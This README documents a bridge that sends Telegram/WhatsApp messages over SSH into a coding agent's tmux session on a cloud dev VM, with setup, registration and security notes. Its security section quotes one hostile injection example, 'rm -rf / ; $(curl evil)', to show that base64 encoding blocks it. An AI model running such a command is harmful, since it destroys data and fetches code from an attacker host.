# Remote Control Bridge — Telegram/WhatsApp → Cloud DevVM agent session

Control a coding agent running on the Cloud DevVM **from the same Telegram/WhatsApp
bots** you already use — replies you type in chat are forwarded over SSH into the
agent's `agentctl` tmux session on the VM. This is **F0** of the
[federation architecture](FEDERATION-ARCHITECTURE.md): the first remote node, proving
the channel → remote-node control path.

## How it works

```
You (Telegram/WhatsApp)
  └─▶ PAI RemoteTaskRouter (allowlist + rate-limit + risky-tool gate)
        └─▶ RemoteCodeInputRouter  ── ssh-vm adapter ──▶  ssh devvm
              (base64-encodes your text)                    └─▶ tmux send-keys → agentctl session
```

The **`ssh-vm` input adapter** (added to the live PAI `RemoteCodeInputRouter.ts`) is
the new piece. It mirrors the existing `tmux-pane` adapter but reaches a **remote**
tmux over SSH. Security properties (unit-tested in
`RemoteCodeInputRouter.sshvm.test.ts`):

- **Your reply text is base64-encoded before it crosses SSH** — it is delivered to
  the agent as *literal data*, never interpreted as a shell command on the VM. A
  hostile reply like `` rm -rf / ; $(curl evil) `` cannot break out.
- **The adapter target is strictly validated** (`<ssh-host>|<tmux-target>`, safe
  charset only) — a malicious target is rejected.
- **Write capability is required** — a read-only registration cannot send input.

## Prerequisites on the VM

The resilience layer must be deployed so `agentctl` + its tmux socket exist:

```bash
# from the repo, against the VM (admin)
ansible-playbook -i '<VM_IP>,' -u devuser --private-key ~/.ssh/<key> \
  -e "install_resilience_layer=true" ansible/playbook.yml --tags resilience
# (or run the full playbook once)
```

And your Mac needs an SSH host alias for the VM (so the adapter target is just a name):

```sshconfig
# ~/.ssh/config
Host devvm
  HostName <VM_PUBLIC_IP>
  User royce
  IdentityFile ~/.ssh/new_id_rsa
```

## Start a controllable VM session

```bash
# 1. On the VM: start the agent in a durable agentctl tmux session
ssh devvm 'agentctl start claude -p myproject -d ~/myproject'
ssh devvm 'agentctl ls'        # note the session name, e.g. agent:myproject:claude

# 2. On your Mac: register it as a remote-code session with an ssh-vm adapter,
#    bound to your Telegram chat. (Run from ~/.claude/PAI/TOOLS.)
bun RemoteCodeSessionRegistry.ts register \
  --id vm-myproject-claude \
  --title "VM: myproject (claude)" \
  --cwd /Volumes/ExternalNVME/GitHub/devvm \
  --channel "telegram:<YOUR_CHAT_ID>" \
  --monitor-kind ssh-vm --monitor-target "devvm|agent:myproject:claude" \
  --adapter-kind ssh-vm --adapter-target "devvm|agent:myproject:claude" \
  --adapter-cap write
```

> If `RemoteCodeSessionRegistry.ts`'s CLI doesn't expose those exact flags yet, use
> the helper `scripts/register_vm_session.ts` in this repo, which calls
> `registerSession()` with the `ssh-vm` adapter shape.

## Use it

In Telegram/WhatsApp, select the session (the bots already list remote-code
sessions) and type a reply — it lands in the agent on the VM. The monitor streams
the agent's output back to the channel. A WireGuard drop or laptop sleep doesn't
stop the agent (it's in `agentctl` tmux); reconnect and keep going.

## Federation note

This same `ssh-vm` adapter generalizes to the home nodes (House/Office/Apartment):
each node's agent runs in its local `agentctl` tmux, registered with an `ssh-vm`
adapter pointing at that node's WireGuard host alias. The central PAI on the DevVM
routes a channel message to the right node by its `channelTarget` / (future)
`locationTarget`. See [FEDERATION-ARCHITECTURE.md](FEDERATION-ARCHITECTURE.md).
